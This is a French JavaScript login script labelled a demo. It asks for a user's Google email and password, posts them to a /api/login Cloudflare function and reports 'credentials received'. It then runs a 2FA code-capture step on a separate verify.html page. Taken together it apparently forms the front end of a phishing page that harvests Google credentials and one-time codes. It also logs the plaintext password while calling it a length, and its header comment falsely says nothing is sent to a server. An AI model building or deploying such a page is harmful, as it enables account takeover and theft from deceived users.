// Authentification front-end (démo)
// Objectif: récupérer l'email et le mot de passe soumis depuis login.html
// Remarque: Aucun envoi côté serveur ici. À connecter à votre API plus tard.

(function() {
  'use strict';

  function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(String(email).toLowerCase());
  }

  function showInlineAlert(container, type, message) {
    const existing = container.querySelector('.auth-alert');
    if (existing) existing.remove();
    const div = document.createElement('div');
    div.className = `auth-alert alert alert-${type}`;
    div.role = 'alert';
    div.textContent = message;
    container.prepend(div);
  }

  document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('login-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const togglePassword = document.getElementById('toggle-password');
    const rememberMe = document.getElementById('remember');

    // Restaurer l'email si "Se souvenir de moi" a été utilisé
    try {
      const rememberedEmail = localStorage.getItem('gs_remember_email');
      if (rememberedEmail && emailInput) {
        emailInput.value = rememberedEmail;
        if (rememberMe) rememberMe.checked = true;
      }
    } catch (_) {}

    if (togglePassword && passwordInput) {
      togglePassword.addEventListener('click', function() {
        const isHidden = passwordInput.getAttribute('type') === 'password';
        passwordInput.setAttribute('type', isHidden ? 'text' : 'password');
        togglePassword.setAttribute('aria-pressed', String(isHidden));
        this.querySelector('i')?.classList.toggle('fa-eye');
        this.querySelector('i')?.classList.toggle('fa-eye-slash');
      });
    }

    if (!form) return;

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const email = (emailInput?.value || '').trim();
      const password = passwordInput?.value || '';

      if (!email || !password) {
        showInlineAlert(form, 'warning', 'Veuillez renseigner votre email et votre mot de passe Google.');
        return;
      }
      if (!isValidEmail(email)) {
        showInlineAlert(form, 'warning', "Format d'email invalide.");
        return;
      }

      // Démo: on récupère les valeurs ici
      // Évitez d'afficher le mot de passe en production.
      console.log('[Identifiants saisis:', { email, passwordLength: password });

      // Mémoriser l'email si demandé
      try {
        if (rememberMe && rememberMe.checked) {
          localStorage.setItem('gs_remember_email', email);
        } else {
          localStorage.removeItem('gs_remember_email');
        }
      } catch (_) {}

      // Envoi vers la fonction Cloudflare Pages
      const submitBtn = form.querySelector('button[type="submit"]');
      const originalText = submitBtn ? submitBtn.textContent : '';
      if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = 'Connexion...';
      }
      showInlineAlert(form, 'info', 'Envoi en cours...');

      fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      })
        .then(async (res) => {
          const data = await res.json().catch(() => ({}));
          if (!res.ok) {
            throw new Error(data?.message || 'Erreur serveur');
          }
          return data;
        })
        .then(async (data) => {
          const ref = data?.id ? ` Référence: ${data.id}` : '';
          showInlineAlert(form, 'success', (data?.message || 'Identifiants reçus.') + ref);
          console.log('[Auth] Réponse /api/login:', data);

          // Étape suivante: démarrer la vérification 2FA
          try {
            const startRes = await fetch('/api/start-verify', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ email, loginId: data?.id || null })
            });
            const startData = await startRes.json().catch(() => ({}));
            if (!startRes.ok) {
              throw new Error(startData?.message || 'Impossible de démarrer la vérification');
            }

            // Sauvegarder la session de vérification (temporaire)
            try {
              const verifySession = {
                verifyId: startData.verifyId,
                email,
                emailMasked: startData?.delivery?.toMasked || email,
                loginId: data?.id || null,
                devCode: startData?.devCode || null,
                createdAt: Date.now()
              };
              sessionStorage.setItem('verify_session', JSON.stringify(verifySession));
            } catch (_) {}

            // Redirection vers la page de vérification
            window.location.href = 'verify.html';
          } catch (err) {
            console.warn('[Auth] /api/start-verify failed, using client fallback:', err);
            // Fallback développement/local: on génère un code local et on passe à la page de vérification
            try {
              const localCode = String(Math.floor(100000 + Math.random() * 900000));
              const verifySession = {
                verifyId: 'local:' + Date.now(),
                email,
                emailMasked: email,
                loginId: data?.id || null,
                devCode: localCode,
                createdAt: Date.now(),
                local: true
              };
              sessionStorage.setItem('verify_session', JSON.stringify(verifySession));
              showInlineAlert(form, 'info', "Mode démo: aucun envoi de code. Un code temporaire a été généré.");
              window.location.href = 'verify.html';
              return;
            } catch (e) {
              showInlineAlert(form, 'danger', `Échec de l'initialisation de la vérification: ${err.message}`);
            }
          }
        })
        .catch((err) => {
          showInlineAlert(form, 'danger', `Échec de l\'envoi: ${err.message}`);
          console.error('[Auth] /api/login error:', err);
        })
        .finally(() => {
          if (submitBtn) {
            submitBtn.disabled = false;
            submitBtn.textContent = originalText || 'Se connecter';
          }
        });
    });
  });
})();
